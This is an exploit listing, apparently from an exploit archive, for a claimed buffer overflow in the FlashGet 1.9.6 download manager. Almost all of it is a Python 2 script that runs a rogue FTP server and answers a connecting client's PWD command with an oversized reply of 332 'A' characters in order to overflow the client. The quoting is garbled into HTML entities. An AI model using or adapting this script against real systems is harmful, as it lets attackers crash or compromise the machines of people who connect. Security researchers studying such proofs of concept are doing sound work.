# Exploit Title: FlashGet 1.9.6 0day Remote Buffer Overflow
# Author: Milad Karimi
# Testen on: Kali Linux
# Software Link: http://www.flashget.com/en/download.htm?uid=undefined
# Version: 1.9.6
# CVE : N/A


from time import sleep
from socket import *

res = [
    &#039;220 WELCOME!! :x\r\n&#039;,
    &#039;331 Password required for %s.\r\n&#039;,
    &#039;230 User %s logged in.\r\n&#039;,
    &#039;250 CWD command successful.\r\n&#039;,
    &#039;257 "%s/" is current directory.\r\n&#039; # <-- %s B0f :x
    ]

buf = &#039;A&#039; * 332

s = socket(AF_INET, SOCK_STREAM)
s.bind((&#039;0.0.0.0&#039;, 21))
s.listen(1)
print &#039;[+] listening on [FTP] 21 ...\n&#039;
c, addr = s.accept()
c.send(res[0])

user = &#039;&#039;

for i in range(1, len(res)):
    req = c.recv(1024)
    print &#039;[*][CLIENT] %s&#039; % (req)
    tmp = res[i]
    if(req.find(&#039;USER&#039;) != -1):
        req = req.replace(&#039;\r\n&#039;, &#039;&#039;)
        user = req.split(&#039;\x20&#039;, 1)[1]
        tmp %= user
    if(req.find(&#039;PASS&#039;) != -1):
        tmp %= user
    if(req.find(&#039;PWD&#039;) != -1):
        tmp %= buf    
    print &#039;[*][SERVER] %s&#039; % (tmp)    
    c.send(tmp)

sleep(5)
c.close()
s.close()

print &#039;[+] DONE&#039;
 
# Discovered By : Milad Karimi

